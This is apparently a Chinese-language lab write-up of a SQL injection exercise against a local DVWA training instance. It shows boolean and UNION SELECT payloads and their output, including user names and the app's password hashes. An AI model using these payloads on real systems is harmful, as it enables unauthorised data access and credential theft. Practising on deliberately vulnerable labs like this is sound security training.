# SQL Injection

這次點開會有新的視窗跑出來，在上面可以用帳號 id query 帳號資訊，要留意的是返回的資訊是兩個欄位，所以要 UNION SELECT 時也要選兩個欄位

### 觀察

用的是 POST

```
POST http://dvwa.localtest/vulnerabilities/sqli/session-input.php
```

```
id=hello&Submit=Submit
```

```
id=2 UNION SELECT last_name,password FROM users -- -
```
壞了 QQ

基本款無效

```sql
1' OR 1='1
```

```
ID: 1' OR 1='1
First name: admin
Surname: admin
```
It works

參考 sqlmap 打 low 難度使用的 payload，運氣好就中了

```sql
1' OR 1=1#
```

```
ID: 1' OR 1=1#
First name: admin
Surname: admin

ID: 1' OR 1=1#
First name: Gordon
Surname: Brown

ID: 1' OR 1=1#
First name: Hack
Surname: Me

ID: 1' OR 1=1#
First name: Pablo
Surname: Picasso

ID: 1' OR 1=1#
First name: Bob
Surname: Smith
```
加上 UNION

```sql
1' UNION SELECT last_name,password FROM users WHERE 1=1 #
```

### Done
```sql
ID: 1' UNION SELECT last_name,password FROM users WHERE 1=1 #
First name: admin
Surname: admin

ID: 1' UNION SELECT last_name,password FROM users WHERE 1=1 #
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 1' UNION SELECT last_name,password FROM users WHERE 1=1 #
First name: Brown
Surname: e99a18c428cb38d5f260853678922e03

ID: 1' UNION SELECT last_name,password FROM users WHERE 1=1 #
First name: Me
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 1' UNION SELECT last_name,password FROM users WHERE 1=1 #
First name: Picasso
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 1' UNION SELECT last_name,password FROM users WHERE 1=1 #
First name: Smith
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```
